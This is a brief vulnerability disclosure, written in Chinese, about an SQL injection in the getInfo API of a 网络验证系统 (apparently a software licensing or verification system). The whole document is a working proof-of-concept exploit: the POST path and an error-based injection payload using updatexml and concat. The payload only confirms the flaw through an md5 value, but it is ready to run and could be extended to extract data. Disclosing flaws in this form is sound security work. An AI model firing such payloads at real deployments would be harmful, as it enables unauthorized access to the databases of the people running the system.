# 网络验证系统getInfo参数存在SQL注入漏洞

网络验证系统getInfo参数 ｜ SQL注入 ｜ —
- **请求**：`POST /index.php/api/Software/getInfo HTTP/1.1`

**Payload**
```
data=123456&id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)
```